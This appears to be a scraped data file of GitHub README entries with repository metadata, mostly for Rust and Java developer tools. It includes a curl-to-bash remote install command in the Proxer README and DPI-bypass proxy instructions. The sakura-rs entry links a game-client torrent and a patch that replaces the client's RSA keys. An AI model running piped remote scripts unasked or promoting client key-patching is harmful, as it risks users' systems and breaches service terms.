   cargo run
```

### Build using custom bootloader

1. Add the following lines to your ./Cargo.toml

   ```text
      [lib]
      path = ""src/main.rs""
      crate-type = [""staticlib""]
   ```

2. Generate ISO using the following command

   ```sh
      cargo make generate_iso
   ```

3. Run:

   ```sh
      cargo make run
   ```

For debugging you could run

```sh
   cargo make dbg
```

and then in another terminal (make sure lldb is installed)

```sh
   lldb
   gdb-remote 1234
```
",0,0,2,MIT,,10.0
armlynobinguar/rust-basics-web3-cebu-polkadot,main,"# Rust Basics for Web3Cebu: Polkadot Workshop

Welcome to the **Polkadot Workshop: Intro to Rust for Web3Cebu** repository! This repo contains essential resources, documentation, and example scripts to guide you through the basics of Rust, focusing on building in the Web3 ecosystem with Polkadot.

## Repository Structure

The repo is organized into the following directories:

- **`docs/`**: Contains comprehensive documentation on Rust topics. These materials will help you understand core Rust concepts relevant to Polkadot development.
  
- **`examples/`**: Contains practical example scripts demonstrating Rust code. These examples are designed to provide hands-on experience and reinforce the concepts discussed in the `docs/` section.

## Getting Started

### Prerequisites

Before you begin, ensure the following tools are installed on your machine:

- **Rust Toolchain**: Install Rust via [rustup](https://rustup.rs/).
- **Polkadot.js**: Install the [Polkadot.js API](https://polkadot.js.org/) if needed for Polkadot integration.

### Cloning the Repository

To clone this repository, use the following command:

```bash
git clone https://github.com/yourusername/rust-basics-web3-cebu-polkadot.git
```

## Running the Examples

To run the example scripts, follow these steps:

1. Navigate to the `examples/` directory:

    ```bash
    cd examples/
    ```

2. Use `cargo` to run the specific example script you want to execute:

    ```bash
    cargo run --example <example-name>
    ```

    Replace `<example-name>` with the name of the example script you'd like to run. For example:

    ```bash
    cargo run --example hello_world
    ```

3. If additional dependencies or packages are required, you will be prompted to install them through `cargo`. Follow the on-screen instructions to complete installation.

## Topics Covered

The workshop covers the following Rust fundamentals:

- Basic Syntax
- Variables and Data Types
- Ownership and Borrowing
- Functions and Modules
- Error Handling
- Traits and Generics
- Rust for Web3 and Polkadot Development

## How to Contribute

We encourage contributions from the community! Here's how you can help:

1. **Fork** this repository by clicking the ""Fork"" button at the top right of this page.

2. **Star** the repository if you find it helpful and want to show your support!

3. **Clone** your forked version to your local machine:

    ```bash
    git clone https://github.com/your-username/rust-basics-web3-cebu-polkadot.git
    ```

4. **Create a new branch** for your feature or fix:

    ```bash
    git checkout -b feature-branch-name
    ```

5. **Make your changes** and commit them:

    ```bash
    git commit -m ""Add your commit message here""
    ```

6. **Push your changes** to your forked repository:

    ```bash
    git push origin feature-branch-name
    ```

7. **Submit a pull request (PR)** to the original repository for review.

Feel free to open an issue if you find any bugs or have suggestions!

## Running Examples after Contribution

After making your contributions, test the example scripts again to ensure your changes work as expected:

1. Go to the `examples/` directory:

    ```bash
    cd examples/
    ```

2. Run the example scripts as before using `cargo`:

    ```bash
    cargo run --example <example-name>
    ```

Make sure your changes do not break any existing examples before submitting your pull request!

## License

This project is licensed under the Apache 2.0 License. See the [LICENSE](LICENSE) file for more details.

## Contact

For any questions or feedback, feel free to reach out to us via our community channels or open an issue in the repo.

",0,0,1,,,7.0
alpapie/piscine-java-test,main,"# Project Setup and Execution Guide

This guide will help you set up the project structure, copy your exercise files, compile, and run your Java code using Maven. The script also supports multiple environments for code execution

## Prerequisites

Make sure you have the following installed:

- **Java** (JDK version 8 or higher)
- **Maven**

### Install Maven

To install Maven, use the following commands based on your operating system:

#### Ubuntu/Debian:

```bash
sudo apt install maven
```

Additionally, you should create a student/ folder and place your exercise folder within it. For example:

```bash
student/
‚îî‚îÄ‚îÄ starMass/
    ‚îî‚îÄ‚îÄ StarMass.java
    ‚îî‚îÄ‚îÄ CelestialObject.java
    ‚îî‚îÄ‚îÄ Galaxy.java
    .....
```
## Run the Script
Execute the script in your terminal using:

```bash
EXERCISE={ExercieName} ./entrypoint.sh
```

*Good luck :)*",0,0,1,,,0.0
vishalkrishnaagQwy/VipLang,master,"# Virtual Interfacing Programming Language (VIPL)

VIPL (Virtual Interfacing Programming Language) is a domain-specific language (DSL) with a syntax similar to Python, designed for flexible and intuitive virtual interfacing. VIPL offers a streamlined syntax and Python-like functionality, making it approachable for those familiar with Python while providing features specific to interfacing tasks. The VIPL compiler is implemented in Java, ensuring performance and portability.

## Features

- **Python-like Syntax**: Easy-to-read and concise, VIPL offers familiar Python syntax, making it accessible to Python developers.
- **Domain-Specific Language**: Focused on virtual interfacing, VIPL is optimized for tasks such as resource management, interfacing, and more.
- **Java-based Compiler**: VIPL's compiler is built in Java, providing cross-platform support and reliable performance.
- **Dynamic Typing and Interfacing Features**: Supports complex expressions, object-oriented programming, and flexible interfacing capabilities.
- **Indentation-based Structure**: Like Python, VIPL relies on indentation for code blocks, making it clean and visually intuitive.

## Getting Started

### Prerequisites

To build and run VIPL, ensure you have the following installed:

- **Java JDK** (version 11 or higher)
- **Git** (for version control)
- **IDE** (optional, but recommended for development)

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/vishalkrishnaagQwy/VipLang/
   cd VipLang
   ```

2. Build the project:
   ```bash
   javac -d bin src/*.java
   ```

3. Run the VIPL compiler:
   ```bash
   java -cp bin Main
   ```

### Examples

#### 1. Hello World

A simple program to display ""Hello, World!"" in VIPL:

```python
print(""Hello, World!"")
```

#### 2. Variables and Data Types

VIPL supports dynamic typing. Here‚Äôs how you can define and print variables:

```groovy
var message = ""Welcome to VIPL""
var count = 42
var pi = 3.14
var is_active = true

print(message)
print(""Count is"", count)
print(""Value of pi:"", pi)
print(""Is active?"", is_active)
```

#### 3. Functions

Define and call functions in VIPL similarly to Python:

```groovy
def greet(var name)
    print(""Hello, "" + name)

greet(""Alice"")
```

#### 4. Control Flow

VIPL includes basic control flow statements like `if`, `else`, and `while`.

```groovy
var age = 18

if age >= 18
    print(""You are eligible to vote."")
else
    print(""You are not eligible to vote."")
```

#### 5. Loops

VIPL supports loops with `for` and `while`. Here‚Äôs an example of both:

```groovy
# While loop
var count = 0
while count < 5
    print(""Count is"", count)
    count += 1

# For loop
for i in range(5)
    print(""Iteration:"", i)
```

#### 6. Object-Oriented Programming

VIPL supports object-oriented programming. Here‚Äôs an example of defining a simple class:

```python
class Person
    def Person(name, age)
        this.name = name
        this.age = age

    def introduce()
        print(""Hi, I am "" + this.name + "" and I am "" + str(this.age) + "" years old."")

# Create an instance of the Person class
p = Person(""Alice"", 30)
p.introduce()
```

### Running VIPL Programs

To run a VIPL program, save your code in a `.vipl` file and pass it to the VIPL compiler:

```bash
java -cp bin Main path/to/your_file.vp
```

## Contributing

VIPL is in the beta stage, and contributions are welcome! Please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix:
   ```bash
   git checkout -b feature-or-fix-name
   ```
3. Commit your changes and push into your branch.
4. Open a pull request and describe your changes.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

Special thanks to everyone who contributed to making VIPL a reality. This project aims to simplify virtual interfacing with an accessible syntax and powerful features.
```

This template now includes examples covering variables, functions, control flow, loops, and object-oriented programming in VIPL, providing a comprehensive guide for new users. Adjust as needed based on specific VIPL features.
",0,0,1,,,1.0
esp-rs/esp-hal-community,main,"# esp-hal-community

![GitHub Actions Workflow Status](https://img.shields.io/github/actions/workflow/status/esp-rs/esp-hal-community/ci.yml?labelColor=1C2C2E&label=CI&logo=github&style=flat-square)
![MIT/Apache-2.0 licensed](https://img.shields.io/badge/license-MIT%2FApache--2.0-blue?labelColor=1C2C2E&style=flat-square)
[![Matrix](https://img.shields.io/matrix/esp-rs:matrix.org?labelColor=1C2C2E&label=join%20matrix&color=BEC5C9&logo=matrix&style=flat-square)](https://matrix.to/#/#esp-rs:matrix.org)

A collection of crates for use alongside [esp-hal], but which are maintained by the community.

[esp-hal]: https://github.com/esp-rs/esp-hal/

## Contributing a Crate

If you have a crate which depends on `esp-hal` and provides some additional functionality, we encourage you to contribute it to this repository!

When opening a pull request to add a new crate, we ask that you please ensure the following criteria are met:

- The new crate follows the `esp-hal-*` naming convention
- The new crate contains `CHANGELOG.md` and `README.md` files, following the formatting of other crates in this repository
- The new crate is added to the CI workflow
- The new crate has been added to `CODEOWNERS` along with your username
  - If you are unable or unwilling to take ownership of this crate for whatever reason, please state such in your pull request and we can try to find an owner for it

Upon approval of your pull request, you will be granted Maintainer privileges on the repository and be added as an owner on [crates.io], assuming you are commiting to be code owner for the added crate.

[crates.io]: https://crates.io

## License

Licensed under either of:

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE) or http://www.apache.org/licenses/LICENSE-2.0)
- MIT license ([LICENSE-MIT](LICENSE-MIT) or http://opensource.org/licenses/MIT)

at your option.

### Contribution notice

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in
the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without
any additional terms or conditions.
",0,5,1,Apache-2.0,ci.yml,7.0
cpsdqs/cohost-dl,main,"# cohost-dl
Downloads posts onto your computer from cohost.org, which is shutting down.

- Post pages are downloaded exactly as they appear on Cohost, including shared posts, comments, and with your display settings (silenced tags, etc.)
- Downloads all of your own posts and all of your liked posts
- If you have a data portability archive: also downloads all posts you‚Äôve commented on
- Legal: using this software does not somehow grant you a license to re-publish posts and comments from other people

See also: [cohost-dl 2](db), which is easier to use and handles large amounts of data much better

## Downloaded Data
Downloaded data will be placed in an `out` directory.

<details>
<summary>Detailed breakdown</summary>

- HTML files openable in a web browser
  - `out/index.html`: a simple overview page
  - `out/~all/index.html`: The Cohost Archive Global Feed
  - `out/{handle}/index.html`: page that shows all posts from {handle}
  - `out/{handle}/post/12345-example.html`: page that shows just that post, as it appeared on cohost.org
- Page resources
  - `out/static/`: files from cohost.org/static, such as CSS files
  - `out/rc/attachment/`: post images and audio files
  - `out/rc/attachment-redirect/`: honestly, no idea. ostensibly also post attachments
  - `out/rc/avatar/`, `out/rc/default-avatar/`: user avatars
  - `out/rc/header/`: user header images
  - `out/rc/external/`: external images not hosted on cohost.org but included in posts
  - `out/{handle}/cdl-index.js`: full-text search index
  - `out/{handle}/cdl-chunk~{handle}~{n}.js`: post data used in the list of all posts
  - `out/~cohost-dl/`: Javascript for all generated pages
- Data files
  - `out/{your-handle}/liked.json`: data for all posts you liked
  - `out/{your-handle}/posts.json`: data for all posts you made
  - `out/{handle}/post/12345-example` (without `.html`): original data for that post from cohost.org
  - `out/~src/{site-version}/`: unpacked source code for the Cohost frontend (used to create cohost-dl Javascript)
  - `out/~headers.json`: stores content type headers for some URLs that don‚Äôt have a good file extension

</details>

For file size, expect something around 1 GB for 1000 posts.

Files you can probably safely rehost online:
- `out/{your-handle}/index.html`
- `out/{your-handle}/cdl-index.js`
- `out/{your-handle}/cdl-chunk~{...}.js`
- `out/~cohost-dl/`
- files in `out/rc/` required for the above page(s) to work

Why other files may not be safe to rehost online:
- `out/{your-handle}/post/12345-example.html`: is a very faithful Cohost page and hence contains all of your settings (sideblogs, muted tags, etc.)
  - The `GENERIC_OBSERVER` setting attempts to mitigate this, but it breaks a bunch of other things
- `out/{not-your-handle}/`: not yours

## Usage
1. Copy `CONFIG.example.ts` to `CONFIG.ts`
2. edit `CONFIG.ts` appropriately
3. Install Deno
4. `./run.sh`
    - if you‚Äôre using a system that doesn‚Äôt support Bash, such as Windows,
      you can just copy the `deno run ...` command from this file and run it directly.

It's safe to interrupt and re-start the script at any time.
Things that have already been downloaded will not be downloaded again,
and any changes in configuration will be taken into account upon restart.

",0,6,2,MIT,,5.0
rerun-io/kittest,main,"# üíªüêà kittest: UI Testing Library for Rust Powered by AccessKit

**kittest** is a GUI testing library for Rust, inspired by [Testing Library](https://testing-library.com/). 
It leverages [AccessKit](https://github.com/AccessKit/accesskit/) to provide a framework-agnostic solution 
for testing user interfaces.

This library is designed to be flexible and works with any GUI framework that supports AccessKit.
Creating new **kittest** integrations is simple and straightforward. To get started, check out our 
[basic integration example](https://github.com/rerun-io/kittest/blob/main/examples/basic_integration.rs).

## Available Integrations
- [egui_kittest](https://github.com/emilk/egui/tree/master/crates/egui_kittest): Official integration for 
  [egui](https://github.com/emilk/egui).
",0,0,3,Apache-2.0,"labels.yml,links.yml,rust.yml,typos.yml",3.0
doroved/proxer,main,"# Proxer

>**Subscribe to us on [Telegram](https://t.me/macproxer) to receive notifications about new versions and updates.**

Network request proxy manager with host filtering on macOS + spoofDPI direct connections. Currently works only with IPv4 HTTP(S) proxies.

![proxer screenshot](screenshot.png)

## How to Install

Just log into your macOS terminal and run the command:

```bash
curl -fsSL https://raw.githubusercontent.com/doroved/proxer/main/install.sh | bash
```
After installation, be sure to run this command to make proxer available in the current terminal session:

```bash
export PATH=$PATH:~/.proxer/bin
```
To update proxer to the latest version, use the same command that was used for installation.

## Key Features:
- Traffic filtering by hosts with caching.
- Basic SpoofDPI support.
- Setting secret token for [Proxerver](https://github.com/doroved/proxerver) to protect against proxy detection.

```
proxer --help

Proxy all macOS network requests with domain-based filtering. Basic spoof DPI for direct connections.

Usage: proxer [OPTIONS]

Options:
      --port <u16>       Set port for proxer. By default, a random port is used.
      --dpi              Enable DPI spoofing for direct connections. Spoofing is disabled by default.
      --config <string>  Path to the configuration file. Example: '/path/to/proxer.(json5|json)'. Default is ~/.proxer/config.json5.
      --token <string>   Secret token to access the HTTP/S proxerver. Must match the token specified in the proxerver configuration.
      --log-error-all    Show all errors. By default, only critical errors are shown. This option is useful for debugging.
  -h, --help             Print help
  -V, --version          Print version
```

The default configuration file is located in `~/.proxer/config.json5`. To edit it, you can quickly open it using the terminal command:

```bash
open -a TextEdit ~/.proxer/config.json5
```

If you want to use your own configuration file, you can specify it at startup using the `--config` flag.
For example, if you are in a directory with the config, you can run proxer as follows:

```bash
proxer --config ./config.json5
```
Configuration file structure:

```json5
[
  {
    ""name"": ""Proxer Free [DE] proxerver"",
    ""enabled"": true,
    ""scheme"": ""HTTPS"",
    ""host"": ""proxerver.freemyip.com"",
    ""port"": 443,
    ""auth_credentials"": {
      ""username"": ""proxerver"",
      ""password"": ""onelove""
    },
    ""filter"": [
      {
        ""name"": ""YouTube"",
        ""domains"": [""*.youtube.com"", ""*.googlevideo.com"", ""*.ggpht.com""]
      },
      {
        ""name"": ""Discord"",
        ""domains"": [
          ""discord.com"",
          ""*.discord.com"",
          ""*.discordapp.com"",
          ""discord-attachments-*.storage.googleapis.com"",
          ""*.discordapp.net"",
          ""gateway.discord.gg""
        ]
      },
      {
        ""name"": ""Test"",
        ""domains"": [""api.ipify.org""]
      }
    ]
  }
]
```
If your proxies don't require authentication, you can leave the `auth_credentials.username` and `auth_credentials.password` fields empty.

## Examples of Proxer Launch Commands

Set port 5555 for the local Proxer server.

```bash
proxer --port 5555
```

Enable basic DPI bypass.
```bash
proxer --dpi
```

Set the secret token that was set when starting the `Proxerver` proxy server. This will allow the proxy server to accept requests only from your client.
```bash
proxer --token 'HelloProxerver'
```

Enable display of all proxy server connection errors.
```bash
proxer --log-error-all
```

To run the Proxer in the background, use nohup, for example:

```bash
nohup proxer [OPTIONS] >/dev/null 2>&1 &
```

Running the Proxer in the background using nohup and saving the output to a file:

```bash
nohup proxer [OPTIONS] > ~/.proxer/log.txt 2>&1 &
```

## Local Build and Run

1. Clone the repository.

```bash
git clone https://github.com/doroved/proxer.git
```

2. Run `cargo build --release` to build the binary.

```bash
cargo build --release
```

3. Run the Proxer binary with configuration.

```bash
./target/release/proxer --config 'proxer.dev.json5'
```

4. Or run it in background process using `nohup`.

```bash
nohup ./target/release/proxer --config 'proxer.dev.json5' >/dev/null 2>&1 &
```

5. To stop Proxer, run this command.

```bash
kill $(pgrep proxer)
```

6. See Proxer running on your machine
```bash
lsof -i -P | grep LISTEN | grep proxer
```

## Interesting projects

- [DumbProxy](https://github.com/SenseUnit/dumbproxy) - Great proxy server with various features
- [SpoofDPI](https://github.com/xvzc/SpoofDPI) - macOS
- [GoodbyeDPI](https://github.com/ValdikSS/GoodbyeDPI) - Windows
- [ByeDPI](https://github.com/hufrea/byedpi) - Windows, Linux
",4,0,3,,,0.0
sakura-rs/sakura-rs,master,"# sakura-rs
![screenshot](screenshot.png)

## About
**sakura-rs** is an open source **Genshin Impact** server emulator. Built on top of [Bevy ECS](https://bevyengine.org/learn/book/getting-started/ecs/), it prioritizes performance and implementation completeness to provide a smooth and efficient gameplay.

## Implementation Status
- `sakura-proto`: a version-agnostic library defining protocol structures with ability to convert their format between different protocol versions.
- `sakura-data`: a library for parsing game data, supporting their initial form of binary blobs, without having to rely on 3rd-party data providers.
- Authentication and encryption protocols are implemented with the same specifications as the official server.
- Extensible and easy-to-understand codebase with use of Bevy's plugin system.

## Getting started
### Requirements
- [Rust](https://www.rust-lang.org/tools/install)
- [PostgreSQL](https://www.postgresql.org/download/)
### Setup
#### a) building from sources (preferred)
```sh
git clone https://git.xeondev.com/sakura-rs/sakura-rs.git
cd sakura-rs
cargo run --release --bin sakura-sdk-server
cargo run --release --bin sakura-dispatch-server
cargo run --release --bin sakura-gate-server
cargo run --release --bin sakura-game-server
```
#### b) using pre-built binaries
Navigate to the [Releases](https://git.xeondev.com/sakura-rs/sakura-rs/releases) page and download the latest release for your platform.<br>
Launch all services: `sakura-sdk-server`, `sakura-dispatch-server`, `sakura-gate-server`, `sakura-game-server`
### Configuration
You should configure each service using their own config files. They're being created in current working directory upon first startup.
#### Database section
You have to specify credentials to work with **PostgreSQL**
##### An example of database configuration:
```toml
[database]
host = ""localhost:5432""
user_name = ""postgres""
password = """"
db_name = ""sakura""
```
### Data
All necessary assets are present in this repository. This includes `ExcelBinOutput`, `BinOutput` and regional keys & configuration.
### Connecting
You have to get a compatible game client. Currently supported one is `OSCBWin5.1.50`, you can [get it here](https://git.xeondev.com/xeon/3/raw/branch/3/GenshinImpact_5.1.50_reversedrooms.torrent). Next, you have to apply [this patch](https://git.xeondev.com/reversedrooms/hk4e-patch/releases), it allows you to connect to local server and replaces RSA encryption keys with custom ones.
## Community
[Our Discord Server](https://discord.gg/reversedrooms) is open for everyone who's interested in our projects!
## Support
Your support for this project is greatly appreciated! If you'd like to contribute, feel free to send a tip [via Boosty](https://boosty.to/xeondev/donate)!",0,0,1,AGPL-3.0,,0.0
maciekglowka/wunderkammer,main,"# Wunderkammer

[![crates.io](https://img.shields.io/crates/v/wunderkammer)](https://crates.io/crates/wunderkammer)
[![Documentation](https://img.shields.io/docsrs/wunderkammer)](https://docs.rs/wunderkammer/)
[![CI](https://github.com/maciekglowka/wunderkammer/actions/workflows/rust.yml/badge.svg)](https://github.com/maciekglowka/wunderkammer/actions/workflows/rust.yml)

**An experimental EC(S) crate.**

Provides a simple Entity-Component structure, meant for small scoped data oriented games (eg. roguelikes).


It aims to solve the most basic requirements of a component storage:

- flexible object composition 
- querying for entities with a certain component set attached and processing their data

The crate is merely a storage data structure and does not enforce any specific game architecture.
It is meant to also work in a traditional game loop context.

Relies completely on static typing and compile time checks, while still allowing
for runtime insertion and removal of components.
    
No unsafe code, internal mutability (like `RefCell`) or dynamic typing
is used. It won't crash on you if you'll try to borrow a component set mutably twice :)

The internal component storage is based on sparse set data structures, rather then archetypes.
It should still provide some level of cache locality - the component data is held in continuous vector types.

## Crate goals

- Simple but flexible data storage for tiny games
- Reliability through compile-time checks and static typing
- Dynamic component insertion and removal
- Recycling of despawned entities
- Easy (de)serialization - via optional `serialize` feature
- As few dependencies as possible (currently only `syn` and `quote` libs to handle derive macros, + `serde` behind a feature flag)

## Example usage

```rust
use wunderkammer::prelude::*;

#[derive(ComponentSet, Default)]
struct Components {
    pub health: ComponentStorage<u32>,
    pub name: ComponentStorage<String>,
    pub player: ComponentStorage<()>, // marker component
    pub poison: ComponentStorage<()>,
    pub strength: ComponentStorage<u32>,
}

#[derive(Default)]
struct Resources {
    current_level: u32,
}

type World = WorldStorage<Components, Resources>;

fn main() {
        let mut world = World::default();

        // spawn player
        let player = world.spawn();
        world.components.health.insert(player, 5);
        world.components.name.insert(player, ""Player"".to_string());
        world.components.player.insert(player, ());
        world.components.strength.insert(player, 3);

        // spawn npcs
        let rat = world.spawn();
        world.components.health.insert(rat, 2);
        world.components.name.insert(rat, ""Rat"".to_string());
        world.components.strength.insert(rat, 1);

        let serpent = world.spawn();
        world.components.health.insert(serpent, 3);
        world.components.name.insert(serpent, ""Serpent"".to_string());
        world.components.strength.insert(serpent, 2);

        // find all npc entities, returns HashSet<Entity>
        let npcs = query!(world, Without(player), With(health));
        assert_eq!(npcs.len(), 2);

        // poison the player and the serpent
        world.components.poison.insert(player, ());
        world.components.poison.insert(serpent, ());

        // apply poison damage
        query_execute_mut!(world, With(health, poison), |_, h: &mut u32, _| {
            *h = h.saturating_sub(1);
        });

        assert_eq!(world.components.health.get(player), Some(&4));
        assert_eq!(world.components.health.get(rat), Some(&2));
        assert_eq!(world.components.health.get(serpent), Some(&2));

        // heal player from poison
        let _ = world.components.poison.remove(player);
        let poisoned = query!(world, With(poison));
        assert_eq!(poisoned.len(), 1);

        // use resource
        world.resources.current_level += 1;
    }
```
",0,0,1,MIT,rust.yml,0.0
galqiwi/demo-aqlm-rs,demo,"# AQLM.rs
This is a code for a demo that runs Llama3.1-8b model in the browser.

Demo can be found [here](https://galqiwi.github.io/aqlm-rs/about.html).
",0,0,1,,rust.yml,0.0
NoelToy/automatic-relationship-finder,main,"[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Maven Central](https://img.shields.io/maven-central/v/io.github.noeltoy/automatic-relationship-finder.svg?label=Maven%20Central)](https://search.maven.org/artifact/io.github.noeltoy/automatic-relationship-finder)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/noeltoy/automatic-relationship-finder?logo=GitHub)](https://github.com/noeltoy/automatic-relationship-finder/releases)
[![javadoc](https://javadoc.io/badge2/io.github.noeltoy/automatic-relationship-finder/javadoc.svg)](https://javadoc.io/doc/io.github.noeltoy/automatic-relationship-finder)
# Automatic Relationship Finder (ARF)

**Automatic Relationship Finder (ARF)** is a Java library that automatically detects implicit relationships between database tables by analyzing column names and data patterns. Designed for OLTP environments where physical relationships may not be defined at the RDBMS level, ARF allows users to configure confidence thresholds for column name and data matching, fine-tuning relationship detection precision. Additionally, ARF provides control over which data types should be considered in relationship checks, ensuring context-specific and targeted analysis.
## Key Features
+ **Automatic Relationship Detection**: ARF identifies relationships between tables in relational databases by analyzing column names and data values, making it useful for databases where physical relationships (like foreign keys) may not be explicitly defined.
+ **Configurable Column Name Matching**: Allows users to specify a confidence level for column name matching, helping the library to recognize and match similarly named columns (e.g., Dist_Code and District Code) based on customizable thresholds.
+ **Data-Based Relationship Matching**: In addition to column names, ARF uses actual data values to detect relationships, allowing for more accurate and context-based results.
+ **Customizable Data Match Confidence**: Users can define a confidence level for data matching, adjusting the sensitivity for relationship detection based on how closely values should match.
+ **Data Type Selection for Matching**: Provides the flexibility to specify which data types (e.g., integers, strings, dates) should be considered when checking for relationships, enabling tailored analysis for different types of data.
+ **Adaptability for OLTP Systems**: Designed with Online Transaction Processing (OLTP) systems in mind, ARF can detect implied relationships in transactional data where explicit keys are not always present.
+ **Java-Based and Easily Integrable**: ARF is built in Java, making it compatible with Java-based applications and libraries, and straightforward to integrate into existing data processing or cataloging systems.

## Use Cases
+ **Data Cataloging and Discovery in Legacy Databases**: Many legacy databases lack explicit primary key-foreign key relationships, which can make data cataloging challenging. ARF helps data cataloging tools infer these implicit relationships, enabling users to understand data linkages without requiring schema modifications.
+ **ETL (Extract, Transform, Load) Optimization**: In ETL workflows, it‚Äôs often crucial to identify relationships between tables to accurately join data from different sources. ARF automates the detection of these relationships, making it easier to configure ETL pipelines for databases that lack physical constraints.
+ **Data Migration Between Systems**: During data migration, especially between OLTP and OLAP systems, ARF can identify hidden relationships within the source data, helping preserve referential integrity and data structure during transformation and loading into the target system.
+ **Database Reverse Engineering**: ARF assists in reverse-engineering undocumented databases by discovering implied relationships between tables, making it easier for developers and data analysts to comprehend the structure and meaning of the data.
+ **Data Quality and Integrity Audits**: By detecting unlinked but related columns, ARF can help data quality tools flag potential data integrity issues, such as missing foreign key constraints or inconsistent data relationships across tables.
+ **Intelligent Data Integration**: When integrating data from multiple sources, ARF can identify potential joins across databases or tables that lack explicit relationships. This capability supports building unified data views and data marts from diverse systems.
+ **Metadata Enrichment for Data Lakes**: For data lakes containing relational data, ARF can help enrich metadata by detecting and documenting relationships. This metadata enrichment supports improved data discovery and governance.
+ **Machine Learning Data Preparation**: In machine learning pipelines, discovering relationships between datasets is essential for feature engineering. ARF helps data scientists automatically detect related tables and columns, making it easier to create joinable datasets and improve model inputs.
+ **Data Lineage Tracking**: Understanding data lineage involves tracing relationships between datasets over time. ARF can aid in capturing implicit relationships as part of a data lineage tracking system, adding context to lineage data that lacks defined foreign keys.

## Dependencies
+ **Java 17 or higher**: The minimum required Java version to run the library.

## Usage/Examples
### Add Maven Dependency
```xml
<dependency>
    <groupId>io.github.noeltoy</groupId>
    <artifactId>automatic-relationship-finder</artifactId>
    <version>1.1</version>
</dependency>
```

### Example
For usage please refer test package.
## License
[Apache License 2.0](https://choosealicense.com/licenses/apache-2.0/)

## Authors
- [@noeltoy](https://github.com/NoelToy)",2,1,2,Apache-2.0,,2.0
bdbai/nyquest,main,"# Nyquest

[![crates.io](https://img.shields.io/crates/v/nyquest.svg)](https://crates.io/crates/nyquest)
[![Released API docs](https://docs.rs/nyquest/badge.svg)](https://docs.rs/nyquest)
[![MIT licensed](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
[![CI](https://github.com/bdbai/nyquest/actions/workflows/run-tests.yml/badge.svg)](https://github.com/bdbai/nyquest/actions/workflows/run-tests.yml)

A truly native HTTP client library for Rust.

## Why Nyquest?

You should ask the other way around: why shipping an entire HTTP stack with your application when you know your users already have WinHTTP/NSURLSession/libcurl/whatever HTTP client library available on their system?

Similar to the [RustCrypto](https://github.com/RustCrypto) ecosystem, Nyquest aims to provide only an abstraction over the HTTP client operations. The actual functionality is implemented by Nyquest backends that talk to either platform APIs or third-party libraries. Even though Nyquest API interface has an async variant, it is not tied to any specific async runtime. Instead, the backends will as much as possible utilize the async mechanism or event loop provided by the system, or manage an event loop for the application. This way, end application developers can easily choose and switch among HTTP client implementations without thinking too much about the details. Library authors can also consume HTTP endpoints without worrying about which async runtime the end application uses.

By using platform native APIs, users will automatically benefit from system-managed security updates, functionality improvements, cache management, global proxy settings etc. that are tightly integrated with the operating system. [^1]

As an end application developer, consider Nyquest if you:

- want to behave like a good citizen on the user's system,
- want to honor the user's system settings for HTTP client, such as proxy,
- do not use an async runtime at all, or
- do not want to pull in the whole hyper or reqwest stack hence to reduce the binary size.

As a library author, consider Nyquest if you:

- want to provide a flexible way for users to choose their HTTP client implementation,
- do not want to assume the async runtime of the end application, or
- do not want to bring maintenance burden of depending on the whole hyper or reqwest stack to your users.

Meanwhile, you might not need Nyquest if you:

- want to minimize the overhead introduced by abstraction or interop with external libraries,
- want to keep every single byte of HTTP requests sent over the wire under your control,
- already have reqwest in your dependency tree, or
- are already maintaining bindings to various HTTP client libraries.

[^1]: Subject to the backend's capability.

## Roadmap

Nyquest is still at POC stage. We want to keep Nyquest itself as a greatest common divisor for all backends, therefore the API surface is subject to change along with the development of backends.

The following items are planned in MVP:

- [x] Nyquest blocking API (WIP)
- [x] Nyquest async API (WIP)
- [ ] URL manipulation utilities
- [x] Backend: WinRT HttpClient (WIP)
    - [x] Blocking (WIP)
    - [x] Async (WIP)
- [x] Backend: libcurl (WIP)
    - [x] Blocking (WIP)
    - [ ] Async (WIP)
- [x] Test framework for backends (WIP)
- [x] Presets (WIP)
- [ ] Documentation

Future work may include:

- [ ] Middleware infrastructure
- [ ] Telemetry
- [ ] Backend: NSURLSession (help wanted!)
- [ ] Backend: Mock
- [ ] Backend: WASM fetch
- [ ] Backend: WinHTTP
- [ ] Backend: libsoup3
- [ ] Backend: reqwest (yes, we can do that)
- [ ] Backend: QNetworkAccessManager
- [ ] Explore alternative options on Android other than libcurl

## License

Licensed under Apache License, Version 2.0 or MIT license, at your option.
",0,0,1,MIT,run-tests.yml,0.0
kmdreko/venator,main,"<p align=""center"">
  <picture>
    <source media=""(prefers-color-scheme: dark)"" height=170 srcset=""docs/images/icon-dark.svg"">
    <source media=""(prefers-color-scheme: light)"" height=170 srcset=""docs/images/icon-light.svg"">
    <img alt=""venator logo"" height=170 src=""docs/images/icon-light.svg"">
  </picture>
</p>

Venator is a library and GUI application for recording, viewing, and filtering logs and spans from Rust programs instrumented with the tracing crate. It is purpose-built for rapid local development.

This is currently in a ""beta"" state; bugs and quirks are to be expected but functionality should be complete. Bug reports and future feature requests are welcome.

## Usage

In your instrumented program:

```toml
[dependencies]
venator = ""0.2.0""
```

```rust
use venator::Venator;

Venator::default().install();
```

Installing the Venator app (Rust 1.76 or newer):

```
cargo install venator-app
```

```
venator
```

## Screenshots:

<picture>
  <source media=""(prefers-color-scheme: dark)"" srcset=""docs/images/screenshot-events-dark.png"">
  <source media=""(prefers-color-scheme: light)"" srcset=""docs/images/screenshot-events-light.png"">
  <img alt=""screenshots of events screen"" src=""docs/images/screenshot-events-light.png"">
</picture>
<picture>
  <source media=""(prefers-color-scheme: dark)"" srcset=""docs/images/screenshot-spans-dark.png"">
  <source media=""(prefers-color-scheme: light)"" srcset=""docs/images/screenshot-spans-light.png"">
  <img alt=""screenshots of spans screen"" src=""docs/images/screenshot-spans-light.png"">
</picture>
<picture>
  <source media=""(prefers-color-scheme: dark)"" srcset=""docs/images/screenshot-traces-dark.png"">
  <source media=""(prefers-color-scheme: light)"" srcset=""docs/images/screenshot-traces-light.png"">
  <img alt=""screenshots of trace screen"" src=""docs/images/screenshot-traces-light.png"">
</picture>
",0,1,1,MIT,,0.0
OwenTrokeBillard/vf2,main,"<div align=""center"">

